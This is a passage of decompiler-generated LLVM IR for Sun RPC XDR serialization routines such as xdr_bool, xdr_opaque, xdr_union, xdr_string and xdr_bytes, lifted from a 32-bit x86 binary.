  %v2_8056d91 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056d91, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056d8c

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056d8c, { 1, 0 }
}

define i32 @xdr_u_char(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i8, align 1
  %v2_8056d9b = load i8, i8* %tmp7, align 1
  store i8 %v2_8056d9b, i8* %stack_var_-8, align 1
  %v2_8056da2 = ptrtoint i8* %stack_var_-8 to i32
  store i32 %v2_8056da2, i32* @eax, align 4
  %v5_8056dab = call i32 @xdr_u_long(i32* %arg1, i32 %v2_8056da2)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8056db5 = icmp eq i32 %v5_8056dab, 0
  br i1 %v1_8056db5, label %dec_label_pc_8056dc1, label %dec_label_pc_8056db9

dec_label_pc_8056db9:                             ; preds = %entry
  %v3_8056db9 = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8056dbf = load i32, i32* @ebx, align 4
  %v3_8056dbf = inttoptr i32 %v2_8056dbf to i8*
  store i8 %v3_8056db9, i8* %v3_8056dbf, align 1
  %v0_8056dc1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056dc1

dec_label_pc_8056dc1:                             ; preds = %entry, %dec_label_pc_8056db9
  %v0_8056dc1 = phi i32 [ 0, %entry ], [ %v0_8056dc1.pre, %dec_label_pc_8056db9 ]
  ret i32 %v0_8056dc1

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056dc1, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8056dd4 = load i32, i32* %arg1, align 4
  %v9_8056dd6 = icmp eq i32 %v2_8056dd4, 1
  br i1 %v9_8056dd6, label %dec_label_pc_8056e08, label %dec_label_pc_8056ddb

dec_label_pc_8056ddb:                             ; preds = %entry
  %v5_8056dd6 = icmp eq i32 %v2_8056dd4, 0
  br i1 %v5_8056dd6, label %dec_label_pc_8056de9, label %dec_label_pc_8056ddd

dec_label_pc_8056ddd:                             ; preds = %dec_label_pc_8056ddb
  %v9_8056de2 = icmp eq i32 %v2_8056dd4, 2
  br i1 %v9_8056de2, label %dec_label_pc_8056e31, label %dec_label_pc_8056e2f

dec_label_pc_8056de9:                             ; preds = %dec_label_pc_8056ddb
  %v1_8056deb = inttoptr i32 %arg2 to i32*
  %v2_8056deb = load i32, i32* %v1_8056deb, align 4
  %v3_8056deb = icmp eq i32 %v2_8056deb, 0
  %v1_8056dee = icmp eq i1 %v3_8056deb, false
  %v2_8056dee = zext i1 %v1_8056dee to i32
  store i32 %v2_8056dee, i32* %stack_var_-8, align 4
  %v1_8056df7 = add i32 %tmp6, 4
  %v2_8056df7 = inttoptr i32 %v1_8056df7 to i32*
  %v3_8056df7 = load i32, i32* %v2_8056df7, align 4
  %v2_8056dfa = ptrtoint i32* %stack_var_-8 to i32
  %v5_8056e00 = add i32 %v3_8056df7, 4
  %v6_8056e00 = inttoptr i32 %v5_8056e00 to i32*
  %v7_8056e00 = load i32, i32* %v6_8056e00, align 4
  call void @__pseudo_call(i32 %v7_8056e00)
  br label %dec_label_pc_8056e31

dec_label_pc_8056e08:                             ; preds = %entry
  %v1_8056e0a = add i32 %tmp6, 4
  %v2_8056e0a = inttoptr i32 %v1_8056e0a to i32*
  %v3_8056e0a = load i32, i32* %v2_8056e0a, align 4
  %v5_8056e13 = inttoptr i32 %v3_8056e0a to i32*
  %v6_8056e13 = load i32, i32* %v5_8056e13, align 4
  call void @__pseudo_call(i32 %v6_8056e13)
  %v1_8056e18 = icmp eq i32 %v3_8056e0a, 0
  br i1 %v1_8056e18, label %dec_label_pc_8056e2f, label %dec_label_pc_8056e1c

dec_label_pc_8056e1c:                             ; preds = %dec_label_pc_8056e08
  %v4_8056e1e = icmp eq i32 %tmp, 0
  %v1_8056e23 = icmp eq i1 %v4_8056e1e, false
  %v2_8056e23 = zext i1 %v1_8056e23 to i32
  %v1_8056e26 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056e26 = inttoptr i32 %v1_8056e26 to i32*
  store i32 %v2_8056e23, i32* %v2_8056e26, align 4
  br label %dec_label_pc_8056e31

dec_label_pc_8056e2f:                             ; preds = %dec_label_pc_8056ddd, %dec_label_pc_8056e08
  br label %dec_label_pc_8056e31

dec_label_pc_8056e31:                             ; preds = %dec_label_pc_8056ddd, %dec_label_pc_8056e1c, %dec_label_pc_8056de9, %dec_label_pc_8056e2f
  %v0_8056e35 = phi i32 [ 1, %dec_label_pc_8056ddd ], [ 1, %dec_label_pc_8056e1c ], [ %v2_8056dfa, %dec_label_pc_8056de9 ], [ 0, %dec_label_pc_8056e2f ]
  %v2_8056e34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056e34, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056e35

; uselistorder directives
  uselistorder i32 %v2_8056dd4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056e31, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056e2f, { 1, 0 }
}

define i32 @xdr_enum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8056e36 = call i32 @__GI_xdr_long()
  ret i32 %v0_8056e36
}

define i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8056e3c = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_8056e4c = icmp eq i32 %tmp, 0
  br i1 %v1_8056e4c, label %dec_label_pc_8056ed5, label %dec_label_pc_8056e50

dec_label_pc_8056e50:                             ; preds = %entry
  %v1_8056e54 = urem i32 %tmp, 4
  %v2_8056e54 = icmp eq i32 %v1_8056e54, 0
  br i1 %v2_8056e54, label %dec_label_pc_8056e5f, label %dec_label_pc_8056e59

dec_label_pc_8056e59:                             ; preds = %dec_label_pc_8056e50
  %v2_8056e5d = sub nsw i32 4, %v1_8056e54
  br label %dec_label_pc_8056e5f

dec_label_pc_8056e5f:                             ; preds = %dec_label_pc_8056e50, %dec_label_pc_8056e59
  %storemerge13 = phi i32 [ %v2_8056e5d, %dec_label_pc_8056e59 ], [ 0, %dec_label_pc_8056e50 ]
  store i32 %storemerge13, i32* %esi.global-to-local, align 4
  %v1_8056e5f = inttoptr i32 %arg2 to i32*
  %v2_8056e5f = load i32, i32* %v1_8056e5f, align 4
  %v9_8056e61 = icmp eq i32 %v2_8056e5f, 1
  br i1 %v9_8056e61, label %dec_label_pc_8056e6f, label %dec_label_pc_8056e66

dec_label_pc_8056e66:                             ; preds = %dec_label_pc_8056e5f
  %v5_8056e61 = icmp eq i32 %v2_8056e5f, 0
  br i1 %v5_8056e61, label %dec_label_pc_8056e9c, label %dec_label_pc_8056e68

dec_label_pc_8056e68:                             ; preds = %dec_label_pc_8056e66
  %v9_8056e68 = icmp eq i32 %v2_8056e5f, 2
  %v1_8056e6b = icmp eq i1 %v9_8056e68, false
  br i1 %v1_8056e6b, label %dec_label_pc_8056ed3, label %dec_label_pc_8056ed5

dec_label_pc_8056e6f:                             ; preds = %dec_label_pc_8056e5f
  %v1_8056e70 = add i32 %arg2, 4
  %v2_8056e70 = inttoptr i32 %v1_8056e70 to i32*
  %v3_8056e70 = load i32, i32* %v2_8056e70, align 4
  %v5_8056e76 = add i32 %v3_8056e70, 8
  %v6_8056e76 = inttoptr i32 %v5_8056e76 to i32*
  %v7_8056e76 = load i32, i32* %v6_8056e76, align 4
  call void @__pseudo_call(i32 %v7_8056e76)
  %v1_8056e7c = icmp eq i32 %v3_8056e70, 0
  br i1 %v1_8056e7c, label %dec_label_pc_8056ed3, label %dec_label_pc_8056e80

dec_label_pc_8056e80:                             ; preds = %dec_label_pc_8056e6f
  %v0_8056e80 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056e80 = icmp eq i32 %v0_8056e80, 0
  br i1 %v1_8056e80, label %dec_label_pc_8056ed5, label %dec_label_pc_8056e84

dec_label_pc_8056e84:                             ; preds = %dec_label_pc_8056e80
  %v0_8056e84 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056e84 = add i32 %v0_8056e84, 4
  %v2_8056e84 = inttoptr i32 %v1_8056e84 to i32*
  %v3_8056e84 = load i32, i32* %v2_8056e84, align 4
  %v1_8056e97 = add i32 %v3_8056e84, 8
  br label %dec_label_pc_8056ec7

dec_label_pc_8056e9c:                             ; preds = %dec_label_pc_8056e66
  %v1_8056e9d = add i32 %arg2, 4
  %v2_8056e9d = inttoptr i32 %v1_8056e9d to i32*
  %v3_8056e9d = load i32, i32* %v2_8056e9d, align 4
  %v5_8056ea3 = add i32 %v3_8056e9d, 12
  %v6_8056ea3 = inttoptr i32 %v5_8056ea3 to i32*
  %v7_8056ea3 = load i32, i32* %v6_8056ea3, align 4
  call void @__pseudo_call(i32 %v7_8056ea3)
  %v1_8056ea9 = icmp eq i32 %v3_8056e9d, 0
  br i1 %v1_8056ea9, label %dec_label_pc_8056ed3, label %dec_label_pc_8056ead

dec_label_pc_8056ead:                             ; preds = %dec_label_pc_8056e9c
  %v0_8056ead = load i32, i32* %esi.global-to-local, align 4
  %v1_8056ead = icmp eq i32 %v0_8056ead, 0
  br i1 %v1_8056ead, label %dec_label_pc_8056ed5, label %dec_label_pc_8056eb1

dec_label_pc_8056eb1:                             ; preds = %dec_label_pc_8056ead
  %v0_8056eb1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056eb1 = add i32 %v0_8056eb1, 4
  %v2_8056eb1 = inttoptr i32 %v1_8056eb1 to i32*
  %v3_8056eb1 = load i32, i32* %v2_8056eb1, align 4
  %v1_8056ec4 = add i32 %v3_8056eb1, 12
  br label %dec_label_pc_8056ec7

dec_label_pc_8056ec7:                             ; preds = %dec_label_pc_8056e84, %dec_label_pc_8056eb1
  %stack_var_0.0 = phi i32 [ %v0_8056e84, %dec_label_pc_8056e84 ], [ %v0_8056eb1, %dec_label_pc_8056eb1 ]
  %storemerge1.in.in = phi i32 [ %v1_8056e97, %dec_label_pc_8056e84 ], [ %v1_8056ec4, %dec_label_pc_8056eb1 ]
  %stack_var_4.0 = phi i32 [ ptrtoint (i32* @global_var_80673dc.311 to i32), %dec_label_pc_8056e84 ], [ ptrtoint (i32* @global_var_805cbbd.312 to i32), %dec_label_pc_8056eb1 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  store i32 %storemerge1, i32* @ecx, align 4
  %v2_8056ec8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056ec8, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056e3c, i32* %esi.global-to-local, align 4
  call void @__pseudo_branch(i32 %storemerge1)
  br label %dec_label_pc_8056ed5

dec_label_pc_8056ed3:                             ; preds = %dec_label_pc_8056e9c, %dec_label_pc_8056e6f, %dec_label_pc_8056e68
  br label %dec_label_pc_8056ed5

dec_label_pc_8056ed5:                             ; preds = %dec_label_pc_8056ec7, %entry, %dec_label_pc_8056e80, %dec_label_pc_8056ead, %dec_label_pc_8056e68, %dec_label_pc_8056ed3
  %stack_var_0.1 = phi i32 [ %arg1, %entry ], [ %arg1, %dec_label_pc_8056ed3 ], [ %arg1, %dec_label_pc_8056e80 ], [ %stack_var_0.0, %dec_label_pc_8056ec7 ], [ %arg1, %dec_label_pc_8056ead ], [ %arg1, %dec_label_pc_8056e68 ]
  %stack_var_4.1 = phi i32 [ %arg2, %entry ], [ %arg2, %dec_label_pc_8056ed3 ], [ %arg2, %dec_label_pc_8056e80 ], [ %stack_var_4.0, %dec_label_pc_8056ec7 ], [ %arg2, %dec_label_pc_8056ead ], [ %arg2, %dec_label_pc_8056e68 ]
  %storemerge = phi i32 [ 1, %entry ], [ 0, %dec_label_pc_8056ed3 ], [ 1, %dec_label_pc_8056e80 ], [ 1, %dec_label_pc_8056ec7 ], [ 1, %dec_label_pc_8056ead ], [ 1, %dec_label_pc_8056e68 ]
  store i32 %stack_var_0.1, i32* @ebx, align 4
  store i32 %stack_var_4.1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8056e5f, { 0, 2, 1 }
  uselistorder i32 %v1_8056e54, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder label %dec_label_pc_8056ed5, { 5, 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_8056ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8056e5f, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8056ed9 = load i32, i32* @ebp, align 4
  %v0_8056eda = load i32, i32* @edi, align 4
  %v0_8056edc = load i32, i32* @ebx, align 4
  store i32 %v0_8056edc, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* %edi.global-to-local, align 4
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  %v2_8056efa = call i32 @xdr_enum(i32 %arg1, i32 %tmp10)
  %v1_8056f02 = icmp eq i32 %v2_8056efa, 0
  br i1 %v1_8056f02, label %dec_label_pc_8056f51, label %dec_label_pc_8056f06

dec_label_pc_8056f06:                             ; preds = %entry
  %v0_8056f06 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056f06 = inttoptr i32 %v0_8056f06 to i32*
  %v2_8056f06 = load i32, i32* %v1_8056f06, align 4
  %v0_8056f27.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f2723 = add i32 %v0_8056f27.pre, 4
  %v2_8056f2724 = inttoptr i32 %v1_8056f2723 to i32*
  %v3_8056f2725 = load i32, i32* %v2_8056f2724, align 4
  store i32 %v3_8056f2725, i32* @ecx, align 4
  %v1_8056f2a26 = icmp eq i32 %v3_8056f2725, 0
  %v1_8056f2c27 = icmp eq i1 %v1_8056f2a26, false
  br i1 %v1_8056f2c27, label %dec_label_pc_8056f0a, label %dec_label_pc_8056f2e

dec_label_pc_8056f0a:                             ; preds = %dec_label_pc_8056f06, %dec_label_pc_8056f24
  %v3_8056f2729 = phi i32 [ %v3_8056f27, %dec_label_pc_8056f24 ], [ %v3_8056f2725, %dec_label_pc_8056f06 ]
  %v0_8056f2428 = phi i32 [ %v1_8056f24, %dec_label_pc_8056f24 ], [ %v0_8056f27.pre, %dec_label_pc_8056f06 ]
  %v1_8056f0a = inttoptr i32 %v0_8056f2428 to i32*
  %v2_8056f0a = load i32, i32* %v1_8056f0a, align 4
  %v14_8056f0a = icmp eq i32 %v2_8056f0a, %v2_8056f06
  %v1_8056f0c = icmp eq i1 %v14_8056f0a, false
  br i1 %v1_8056f0c, label %dec_label_pc_8056f24, label %dec_label_pc_8056f0e

dec_label_pc_8056f0e:                             ; preds = %dec_label_pc_8056f0a
  br label %dec_label_pc_8056f48

dec_label_pc_8056f24:                             ; preds = %dec_label_pc_8056f0a
  %v1_8056f24 = add i32 %v0_8056f2428, 8
  store i32 %v1_8056f24, i32* %ebx.global-to-local, align 4
  %v1_8056f27 = add i32 %v0_8056f2428, 12
  %v2_8056f27 = inttoptr i32 %v1_8056f27 to i32*
  %v3_8056f27 = load i32, i32* %v2_8056f27, align 4
  store i32 %v3_8056f27, i32* @ecx, align 4
  %v1_8056f2a = icmp eq i32 %v3_8056f27, 0
  %v1_8056f2c = icmp eq i1 %v1_8056f2a, false
  br i1 %v1_8056f2c, label %dec_label_pc_8056f0a, label %dec_label_pc_8056f2e

dec_label_pc_8056f2e:                             ; preds = %dec_label_pc_8056f24, %dec_label_pc_8056f06
  %v1_8056f2e = icmp eq i32 %arg5, 0
  br i1 %v1_8056f2e, label %dec_label_pc_8056f51, label %dec_label_pc_8056f32

dec_label_pc_8056f32:                             ; preds = %dec_label_pc_8056f2e
  store i32 %arg5, i32* @ecx, align 4
  br label %dec_label_pc_8056f48

dec_label_pc_8056f48:                             ; preds = %dec_label_pc_8056f0e, %dec_label_pc_8056f32
  %v0_8056f4f = phi i32 [ %v3_8056f2729, %dec_label_pc_8056f0e ], [ %arg5, %dec_label_pc_8056f32 ]
  %v2_8056f4b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056f4b, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056eda, i32* %edi.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8056f4f)
  br label %dec_label_pc_8056f51

dec_label_pc_8056f51:                             ; preds = %dec_label_pc_8056f2e, %entry, %dec_label_pc_8056f48
  %v2_8056f56 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056f56, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056eda, i32* @edi, align 4
  store i32 %v0_8056ed9, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_8056f27, { 1, 2, 0 }
  uselistorder i32 %v1_8056f24, { 1, 0 }
  uselistorder i32 %v0_8056f2428, { 0, 2, 1 }
  uselistorder i32 %v0_8056eda, { 1, 0 }
  uselistorder void (i32)* @__pseudo_branch, { 3, 5, 6, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32)* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder label %dec_label_pc_8056f51, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056f48, { 1, 0 }
  uselistorder label %dec_label_pc_8056f0a, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp16 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8056f5b = load i32, i32* @edi, align 4
  %v0_8056f5c = load i32, i32* @esi, align 4
  %v0_8056f5d = load i32, i32* @ebx, align 4
  store i32 %tmp16, i32* @esi, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_8056f69 = load i32, i32* %arg1, align 4
  store i32 %v2_8056f69, i32* %eax.global-to-local, align 4
  %v1_8056f6b = inttoptr i32 %arg2 to i32*
  %v2_8056f6b = load i32, i32* %v1_8056f6b, align 4
  %v1_8056f6d = icmp eq i32 %v2_8056f69, 0
  br i1 %v1_8056f6d, label %dec_label_pc_8056f7f, label %dec_label_pc_8056f71

dec_label_pc_8056f71:                             ; preds = %entry
  %v9_8056f71 = icmp eq i32 %v2_8056f69, 2
  %v1_8056f74 = icmp eq i1 %v9_8056f71, false
  br i1 %v1_8056f74, label %dec_label_pc_8056f71.dec_label_pc_8056f97_crit_edge, label %dec_label_pc_8056f76

dec_label_pc_8056f71.dec_label_pc_8056f97_crit_edge: ; preds = %dec_label_pc_8056f71
  br label %dec_label_pc_8056f97

dec_label_pc_8056f76:                             ; preds = %dec_label_pc_8056f71
  %v1_8056f76 = icmp eq i32 %v2_8056f6b, 0
  %v1_8056f78 = icmp eq i1 %v1_8056f76, false
  br i1 %v1_8056f78, label %dec_label_pc_8056f87, label %dec_label_pc_8057029

dec_label_pc_8056f7f:                             ; preds = %entry
  %v1_8056f7f = icmp eq i32 %v2_8056f6b, 0
  br i1 %v1_8056f7f, label %dec_label_pc_8057030, label %dec_label_pc_8056f87

dec_label_pc_8056f87:                             ; preds = %dec_label_pc_8056f7f, %dec_label_pc_8056f76
  %v5_8056f8a = inttoptr i32 %v2_8056f6b to i8*
  %v3_8056f8b = call i32 @strlen(i8* %v5_8056f8a)
  store i32 %v3_8056f8b, i32* %eax.global-to-local, align 4
  store i32 %v3_8056f8b, i32* %stack_var_-16, align 4
  %v0_8056f9e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056f97

dec_label_pc_8056f97:                             ; preds = %dec_label_pc_8056f71.dec_label_pc_8056f97_crit_edge, %dec_label_pc_8056f87
  %v0_8056f9e = phi i32 [ %tmp16, %dec_label_pc_8056f71.dec_label_pc_8056f97_crit_edge ], [ %v0_8056f9e.pre, %dec_label_pc_8056f87 ]
  %v2_8056f99 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8056f99, i32* @eax, align 4
  %tmp27 = inttoptr i32 %v0_8056f9e to i32*
  %v6_8056f9f = call i32 @xdr_u_long(i32* %tmp27, i32 %v2_8056f99)
  store i32 %v6_8056f9f, i32* %eax.global-to-local, align 4
  %v1_8056fa7 = icmp eq i32 %v6_8056f9f, 0
  br i1 %v1_8056fa7, label %dec_label_pc_8057030, label %dec_label_pc_8056faf

dec_label_pc_8056faf:                             ; preds = %dec_label_pc_8056f97
  %v3_8056faf = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_8056faf, i32* %eax.global-to-local, align 4
  %v6_8056fb7 = icmp ugt i32 %v3_8056faf, %arg3
  br i1 %v6_8056fb7, label %dec_label_pc_8057030, label %dec_label_pc_8056fb9

dec_label_pc_8056fb9:                             ; preds = %dec_label_pc_8056faf
  %v0_8056fb9 = load i32, i32* @esi, align 4
  %v1_8056fb9 = inttoptr i32 %v0_8056fb9 to i32*
  %v2_8056fb9 = load i32, i32* %v1_8056fb9, align 4
  %v9_8056fbb = icmp eq i32 %v2_8056fb9, 1
  br i1 %v9_8056fbb, label %dec_label_pc_8056fc9, label %dec_label_pc_8056fc0

dec_label_pc_8056fc0:                             ; preds = %dec_label_pc_8056fb9
  %v5_8056fbb = icmp eq i32 %v2_8056fb9, 0
  br i1 %v5_8056fbb, label %dec_label_pc_8057002, label %dec_label_pc_8056fc2

dec_label_pc_8056fc2:                             ; preds = %dec_label_pc_8056fc0
  %v9_8056fc2 = icmp eq i32 %v2_8056fb9, 2
  %v1_8056fc5 = icmp eq i1 %v9_8056fc2, false
  br i1 %v1_8056fc5, label %dec_label_pc_8057030, label %dec_label_pc_8057013

dec_label_pc_8056fc9:                             ; preds = %dec_label_pc_8056fb9
  %v1_8056fc9 = add i32 %v3_8056faf, 1
  %v8_8056fc9 = icmp eq i32 %v1_8056fc9, 0
  store i32 %v1_8056fc9, i32* %eax.global-to-local, align 4
  br i1 %v8_8056fc9, label %dec_label_pc_8057029, label %dec_label_pc_8056fcc

dec_label_pc_8056fcc:                             ; preds = %dec_label_pc_8056fc9
  %v0_8056fcc = load i32, i32* @ebx, align 4
  %v1_8056fcc = icmp eq i32 %v0_8056fcc, 0
  %v1_8056fce = icmp eq i1 %v1_8056fcc, false
  br i1 %v1_8056fce, label %dec_label_pc_8056ffa, label %dec_label_pc_8056fd0

dec_label_pc_8056fd0:                             ; preds = %dec_label_pc_8056fcc
  %v2_8056fd4 = call i32 @malloc(i32 %v1_8056fc9)
  store i32 %v2_8056fd4, i32* %eax.global-to-local, align 4
  store i32 %v2_8056fd4, i32* @ebx, align 4
  %v1_8056fde = load i32, i32* @edi, align 4
  %v2_8056fde = inttoptr i32 %v1_8056fde to i32*
  store i32 %v2_8056fd4, i32* %v2_8056fde, align 4
  %v1_8056fe0 = icmp eq i32 %v2_8056fd4, 0
  %v1_8056fe2 = icmp eq i1 %v1_8056fe0, false
  br i1 %v1_8056fe2, label %dec_label_pc_8056fd0.dec_label_pc_8056ffa_crit_edge, label %dec_label_pc_8056fe4

dec_label_pc_8056fd0.dec_label_pc_8056ffa_crit_edge: ; preds = %dec_label_pc_8056fd0
  %v3_8056ffa.pre = load i32, i32* %stack_var_-16, align 4
  %v0_8056ffe.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056ffa

dec_label_pc_8056fe4:                             ; preds = %dec_label_pc_8056fd0
  %v0_8056fe6 = load i32, i32* @global_var_80627d0, align 16
  %v3_8056ff1 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_805cb88.313 to i32), i32 %v0_8056fe6)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805700e

dec_label_pc_8056ffa:                             ; preds = %dec_label_pc_8056fd0.dec_label_pc_8056ffa_crit_edge, %dec_label_pc_8056fcc
  %v0_8056ffe = phi i32 [ %v0_8056ffe.pre, %dec_label_pc_8056fd0.dec_label_pc_8056ffa_crit_edge ], [ %v0_8056fcc, %dec_label_pc_8056fcc ]
  %v3_8056ffa = phi i32 [ %v3_8056ffa.pre, %dec_label_pc_8056fd0.dec_label_pc_8056ffa_crit_edge ], [ %v3_8056faf, %dec_label_pc_8056fcc ]
  store i32 %v3_8056ffa, i32* %eax.global-to-local, align 4
  %v2_8056ffe = add i32 %v3_8056ffa, %v0_8056ffe
  %v3_8056ffe = inttoptr i32 %v2_8056ffe to i8*
  store i8 0, i8* %v3_8056ffe, align 1
  %v3_8057003.pre = load i32, i32* %stack_var_-16, align 4
  %v0_8057008.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057002

dec_label_pc_8057002:                             ; preds = %dec_label_pc_8056fc0, %dec_label_pc_8056ffa
  %v0_8057008 = phi i32 [ %v0_8056fb9, %dec_label_pc_8056fc0 ], [ %v0_8057008.pre, %dec_label_pc_8056ffa ]
  %v3_8057003 = phi i32 [ %v3_8056faf, %dec_label_pc_8056fc0 ], [ %v3_8057003.pre, %dec_label_pc_8056ffa ]
  %v0_8057007 = load i32, i32* @ebx, align 4
  %v5_8057009 = call i32 @xdr_opaque(i32 %v0_8057008, i32 %v0_8057007, i32 %v3_8057003)
  store i32 %v5_8057009, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805700e

dec_label_pc_805700e:                             ; preds = %dec_label_pc_8057013, %dec_label_pc_8056fe4, %dec_label_pc_8057002
  %v0_8057038.pre = phi i32 [ %v0_8057038.pre.pre, %dec_label_pc_8057013 ], [ 0, %dec_label_pc_8056fe4 ], [ %v5_8057009, %dec_label_pc_8057002 ]
  br label %dec_label_pc_8057032

dec_label_pc_8057013:                             ; preds = %dec_label_pc_8056fc2
  %v0_8057016 = load i32, i32* @ebx, align 4
  %v2_8057017 = call i32 @free(i32 %v0_8057016)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8057021 = load i32, i32* @edi, align 4
  %v1_8057021 = inttoptr i32 %v0_8057021 to i32*
  store i32 0, i32* %v1_8057021, align 4
  %v0_8057038.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805700e

dec_label_pc_8057029:                             ; preds = %dec_label_pc_8056f76, %dec_label_pc_8056fc9
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057032

dec_label_pc_8057030:                             ; preds = %dec_label_pc_8056fc2, %dec_label_pc_8056faf, %dec_label_pc_8056f97, %dec_label_pc_8056f7f
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057032

dec_label_pc_8057032:                             ; preds = %dec_label_pc_8057029, %dec_label_pc_805700e, %dec_label_pc_8057030
  %v0_8057038 = phi i32 [ 1, %dec_label_pc_8057029 ], [ %v0_8057038.pre, %dec_label_pc_805700e ], [ 0, %dec_label_pc_8057030 ]
  store i32 %v0_8056f5d, i32* @ebx, align 4
  store i32 %v0_8056f5c, i32* @esi, align 4
  store i32 %v0_8056f5b, i32* @edi, align 4
  ret i32 %v0_8057038

; uselistorder directives
  uselistorder i32 %v2_8056fd4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8056fb9, { 0, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8057032, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057029, { 1, 0 }
  uselistorder label %dec_label_pc_805700e, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8057002, { 1, 0 }
  uselistorder label %dec_label_pc_8056f97, { 1, 0 }
}

define i32 @xdr_wrapstring(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8057046 = inttoptr i32 %arg1 to i32*
  %v4_8057046 = call i32 @__GI_xdr_string(i32* %v3_8057046, i32 %arg2, i32 -1)
  %v1_805704b = icmp eq i32 %v4_8057046, 0
  %v1_805704d = icmp eq i1 %v1_805704b, false
  %v2_805704d = zext i1 %v1_805704d to i32
  ret i32 %v2_805704d
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp9 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8057057 = load i32, i32* @ebp, align 4
  %v0_8057058 = load i32, i32* @edi, align 4
  %v0_8057059 = load i32, i32* @esi, align 4
  %v0_805705a = load i32, i32* @ebx, align 4
  store i32 %v0_805705a, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg4, i32* @eax, align 4
  store i32 %tmp9, i32* @edi, align 4
